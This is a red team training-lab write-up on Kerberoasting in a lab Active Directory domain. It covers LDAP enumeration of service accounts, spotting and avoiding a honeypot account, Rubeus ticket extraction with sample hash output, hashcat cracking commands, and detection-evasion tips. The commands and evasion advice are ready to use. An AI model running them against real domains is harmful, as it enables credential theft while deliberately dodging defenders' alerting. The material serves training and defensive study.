# CRTO — Credential Access: Kerberoasting (Challenge Lab)

**Course:** Red Team Ops (CRTO) by RastaMouse — Zero Point Security
**Lab:** Kerberoasting Challenge
**Objective:** Identify Kerberoastable accounts via LDAP enumeration, avoid querying the honeypot account, and extract a TGS hash for the legitimate service account

---

## The Full Chain

```
ldapsearch → enumerate Kerberoastable accounts (SPN set, not krbtgt, not disabled)
    ↓
Identify two results: mssql_svc (legitimate) and crobin (honeypot — HoneySvc)
    ↓
Target only mssql_svc with Rubeus kerberoast /user: flag
    ↓
TGS hash extracted for mssql_svc → RC4_HMAC encrypted
    ↓
Crack offline with hashcat
```

---

## Step 1 — Enumerate Kerberoastable Accounts via LDAP

```
ldapsearch (&(samAccountType=805306368)(servicePrincipalName=*)(!samAccountName=krbtgt)(!(UserAccountControl:1.2.840.113556.1.4.803:=2))) --attributes name,samAccountName,servicePrincipalName
```

### LDAP Filter Breakdown

| Filter Component | Meaning |
|---|---|
| `samAccountType=805306368` | User accounts only (`SAM_USER_OBJECT`) |
| `servicePrincipalName=*` | Must have at least one SPN set — prerequisite for Kerberoasting |
| `!samAccountName=krbtgt` | Exclude krbtgt — it has an SPN but Kerberoasting it is pointless and noisy |
| `!(UserAccountControl:1.2.840.113556.1.4.803:=2)` | Exclude disabled accounts — UAC bit 2 = `ACCOUNTDISABLE` |

### Results Returned

```
name: MSSQL Service
sAMAccountName: mssql_svc
servicePrincipalName: MSSQLSvc/lon-db-1.contoso.com:1433, MSSQLSvc/lon-db-1.contoso.com

name: Christopher Robin
sAMAccountName: crobin
servicePrincipalName: HoneySvc/lon-pooh-1.contoso.com
```

---

## Step 2 — Identify the Honeypot

Two Kerberoastable accounts returned — only one is a legitimate target.

| Account | SPN | Red Flag |
|---|---|---|
| `mssql_svc` | `MSSQLSvc/lon-db-1.contoso.com:1433` | Legitimate — standard MSSQL SPN format on a DB server |
| `crobin` | `HoneySvc/lon-pooh-1.contoso.com` | **Honeypot** — `HoneySvc` is not a real service type; `lon-pooh-1` is not a real host |

**Why `crobin` is a honeypot:**
- `HoneySvc` is not a recognised Windows service class — real SPNs follow formats like `MSSQLSvc/`, `HTTP/`, `HOST/`, `LDAP/`, `cifs/`
- The hostname `lon-pooh-1` doesn't exist in the environment — requesting a TGS for a non-existent host SPN is detectable
- Honeypot accounts are configured with alerting on any TGS request — querying it triggers an immediate alert
- The account name `Christopher Robin` + `lon-pooh-1` is a deliberate tell by RastaMouse — Winnie the Pooh reference

**Key lesson:** Always inspect SPNs before Kerberoasting. A blanket `/rc4opsec` or unfiltered kerberoast against all accounts will hit the honeypot and fire an alert.

---

## Step 3 — Targeted Kerberoast (mssql_svc Only)

```
execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe kerberoast /user:mssql_svc /nowrap
```

**Rubeus flags:**

| Flag | Purpose |
|---|---|
| `kerberoast` | Request TGS tickets for accounts with SPNs and extract the encrypted portion |
| `/user:mssql_svc` | Target only this specific account — avoids touching the honeypot |
| `/nowrap` | Output the hash on a single line — easier to copy into hashcat |

### Output

```
[*] SamAccountName     : mssql_svc
[*] DistinguishedName  : CN=MSSQL Service,CN=Users,DC=contoso,DC=com
[*] ServicePrincipalName : MSSQLSvc/lon-db-1.contoso.com:1433
[*] PwdLastSet         : 14/02/2025 14:07:52
[*] Supported ETypes   : RC4_HMAC_DEFAULT

[*] Hash:
$krb5tgs$23$*mssql_svc$contoso.com$MSSQLSvc/lon-db-1.contoso.com:1433@contoso.com*$C9F1131A3F665A930852A299D0C51106$D30349B003AA0FE64802207FAAAC4433D239965BE06F4968DB502207C718B8690F3C61E73020AEF88...
```

**Key fields to note:**

| Field | Value | Significance |
|---|---|---|
| `Supported ETypes` | `RC4_HMAC_DEFAULT` | Hash is RC4 — faster to crack than AES128/256 |
| `$krb5tgs$23$` | Hash type identifier | `23` = RC4-HMAC — hashcat mode `-m 13100` |
| `PwdLastSet` | 14/02/2025 | Recent password set — may be a strong password, but RC4 is still crackable |

---

## Step 4 — Crack Offline with Hashcat

```bash
hashcat -m 13100 mssql_svc.hash /usr/share/wordlists/rockyou.txt --force
```

**Hashcat mode reference for Kerberos hashes:**

| Mode | Hash Type | Ticket Type |
|---|---|---|
| `13100` | RC4-HMAC (`$krb5tgs$23`) | TGS (Kerberoast) |
| `19600` | AES128-CTS-HMAC-SHA1 (`$krb5tgs$17`) | TGS (Kerberoast) |
| `19700` | AES256-CTS-HMAC-SHA1 (`$krb5tgs$18`) | TGS (Kerberoast) |
| `18200` | RC4-HMAC (`$krb5asrep$23`) | AS-REP (ASREPRoast) |

---

## How Kerberoasting Works

```
1. Beacon (as any domain user) sends a TGS-REQ to the KDC
   requesting a service ticket for mssql_svc's SPN

2. KDC responds with a TGS encrypted with mssql_svc's NTLM hash
   (RC4_HMAC by default if account supports it)

3. Rubeus extracts the encrypted blob from the TGS
   — no interaction with the target service, no authentication attempt

4. Hash is cracked offline → plaintext password recovered
```

> **Why this is stealthy (mostly):** Any domain user can request a TGS for any SPN — it's normal Kerberos behaviour. The KDC logs the request but it doesn't stand out unless you're requesting tickets for honeypot accounts or requesting many tickets in a short window.

---

## OPSEC Considerations

| Risk | Mitigation |
|---|---|
| Hitting honeypot accounts | Inspect SPNs manually before requesting — use `/user:` to target specifically |
| Bulk TGS requests | Never run kerberoast without `/user:` against all accounts — use LDAP enum first |
| RC4 downgrade detection | Some environments alert on RC4 TGS requests if the account supports AES — use `/rc4opsec` to request only RC4 tickets (avoids AES→RC4 downgrade logging) |
| Service account password age | Check `PwdLastSet` — recently rotated passwords are harder to crack |

---

## MITRE ATT&CK Mapping

| TTP | Technique | Detail |
|---|---|---|
| T1558.003 | Steal or Forge Kerberos Tickets: Kerberoasting | TGS request for SPN accounts, crack offline |
| T1069.002 | Permission Groups Discovery: Domain Groups | LDAP enumeration of SPN accounts |
| T1110.002 | Brute Force: Password Cracking | Offline hashcat crack of TGS hash |

---

## Key Takeaways

- Always **enumerate SPNs via LDAP first** before running Rubeus — never blindly kerberoast all accounts
- **Inspect every SPN** returned — honeypot accounts use fake service names and non-existent hostnames
- Use `/user:` to target specific accounts — never run an unfiltered kerberoast in a monitored environment
- `RC4_HMAC_DEFAULT` (`$krb5tgs$23`) = hashcat mode `13100` — fastest to crack
- AES-encrypted TGS hashes are significantly harder to crack — if an account only supports AES, deprioritise it
- `PwdLastSet` is a signal — old passwords are more likely to be weak; recently set passwords may be stronger
- Kerberoasting requires **zero special privileges** — any authenticated domain user can request TGS tickets for any SPN
